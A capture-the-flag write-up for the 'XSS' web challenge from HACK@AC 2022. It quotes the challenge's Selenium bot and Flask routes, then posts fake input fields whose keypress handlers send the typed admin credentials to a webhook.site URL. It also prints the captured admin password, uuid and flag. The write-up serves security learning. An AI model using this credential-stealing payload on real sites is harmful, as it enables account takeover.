Title: XSS

Decription:
```
I really hate script kiddies... There was one guy recently going around talking about his new website. All he did was copy my website!!! >:(

Now all he does all day is look at the new posts people send him... He even announced that he uses a password autofill manager to make sure no one steals his creds and views his own post. We need to teach these script kiddies a lesson!

btw you can sign up for an account just by logging in with your new creds (that's how kool my site is)

Link: http://alpha.8059blank.ml:4003
Mirror: http://beta.8059blank.ml:4003

Author: Lucas
```

Given hint: Do read through the bot's code and identify which nodes the Selenium driver looks for, and find a way to extract the input to a webhook

Files given: https://github.com/Coder-Here/HACK-AC-2022-CTF/blob/main/Web/XSS/dist.zip

the bot.py code:

```
from threading import Thread
from os import getenv

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service

USERNAME = getenv('USERNAME')
PASSWORD = getenv('PASSWORD')

class Bot(Thread):
    def __init__(self, uuid):
        Thread.__init__(self)
        self.uuid = uuid

    def run(self):
        options = Options()
        options.headless = True
        driver = webdriver.Firefox(service=Service('./geckodriver'), options=options)
        driver.get(f'http://localhost:5000/render/{self.uuid}')
        try:
            username = driver.find_element(By.ID, 'username')
            assert username.tag_name == 'input'
            password = driver.find_element(By.ID, 'password')
            assert password.tag_name == 'input'
        except:
            pass
        else:
            username.send_keys(USERNAME)
            username.send_keys(Keys.ENTER)
            password.send_keys(PASSWORD)
            password.send_keys(Keys.ENTER)
        finally:
            driver.quit()

```

We can grab the admin password when the bot enters them at

```
            username.send_keys(USERNAME)
            username.send_keys(Keys.ENTER)
            password.send_keys(PASSWORD)
            password.send_keys(Keys.ENTER)
```

Using XSS by entering script into the post box, with webhook. Go to https://webhook.site/ and get your specific id.

![image](https://user-images.githubusercontent.com/63996033/197471375-52854289-bff2-4b35-aa18-f606f2b30c90.png)

Use this code and post it.

```
<input id = "username" onkeypress="if(event.keyCode == 13){const http=new XMLHttpRequest();http.open('GET', 'https://webhook.site/<YOUR ID>?hi='+document.getElementById('username').value);http.send();}" /> 
<input id = "password" onkeypress="if(event.keyCode == 13){const http=new XMLHttpRequest();http.open('GET', 'https://webhook.site/<YOUR ID>?hi2='+document.getElementById('password').value);http.send();}" /> 
```

In app.py, there is this code that will trigger the bot to enter the password.

```
@app.route('/visit/<uuid>')
def visit(uuid):
    thread = Bot(uuid)
    thread.start()
    return 'very interesting post, from that i\'ve gotten your ip and will now proceed to HACK you!!!!!!!!!!!!!!!!!!!!'
```

Therefore, we need to go to /visit/<uuid>

First we need to get our uuid by looking in the cookies at devtools -> application:

![image](https://user-images.githubusercontent.com/63996033/197473180-37aef8df-8031-4246-9b14-292f01871669.png)

In my case, UUID = e04de7be-9192-4b60-bb48-2d441b808b66

It will show us this when we go to the /visit/e04de7be-9192-4b60-bb48-2d441b808b66

![image](https://user-images.githubusercontent.com/63996033/197473289-6547a03b-c908-43a3-aabe-64322330f418.png)

This will trigger the bot to input the password which will be caught by the webhook.

![image](https://user-images.githubusercontent.com/63996033/197473484-7f73d17f-dd4e-43de-a4a8-1e490700604b.png)
![image](https://user-images.githubusercontent.com/63996033/197473518-5c9c1389-ea0d-415f-8924-d562cf63ef5a.png)

There we have it. The webhook shows the username and password. admin:eNkfeunrNgVCe9xR3Xv4HeVw5Kx2VBC7

Now we login again as admin: Delete the uuid cookie which requires you to login again

![image](https://user-images.githubusercontent.com/63996033/197473717-b4e42394-337b-4a8c-85da-6090050e255c.png)

In app.py, we can see that it will show us the flag when we go to /render/<uuid> when the uuid is that of the admin.

```
@app.route('/render/<uuid>')
def render(uuid):
    with sqlite3.connect('./db') as cnx:
        cursor = cnx.cursor()
        cursor.execute('SELECT post FROM users WHERE uuid = ?', (uuid,))
        if (post := cursor.fetchone()):
            return post[0]
        else:
            return redirect('/')

```

Let's get the uuid of admin first: a68451d1-9041-4f56-9cb8-1a849ad115b8

![image](https://user-images.githubusercontent.com/63996033/197474201-59f46818-da5a-45fc-87e0-4b48bd53b879.png)

Going to /render/<uuid> with uuid of admin,it gives us the flag:

![image](https://user-images.githubusercontent.com/63996033/197474337-501694bf-9788-4a38-960c-93532da0d908.png)

Flag: ACSI{br0ws3r_p4ssw0rd_m4nag3rs_4r3_f0r_scr1pt_k1dd135}
